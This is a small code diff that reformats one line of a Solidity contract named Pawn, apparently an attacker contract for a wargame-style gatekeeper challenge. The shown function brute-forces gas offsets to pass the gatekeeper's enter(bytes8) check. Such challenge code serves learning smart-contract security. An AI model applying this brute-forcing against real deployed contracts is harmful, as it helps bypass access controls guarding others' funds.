@@ -27,8 +27,9 @@ contract Pawn {
 
     function recon(bytes8 _gateKey) public returns (uint256) {
         for (uint256 offset = 0; offset < 8191; offset++) {
-            (bool success,) =
-                address(gatekeeper).call{gas: 8191 * 3 + offset}(abi.encodeWithSignature(("enter(bytes8)"), _gateKey));
+            (bool success,) = address(gatekeeper).call{gas: 8191 * 3 + offset}(
+                abi.encodeWithSignature(("enter(bytes8)"), _gateKey)
+            );
             if (success) {
                 return offset;
             }
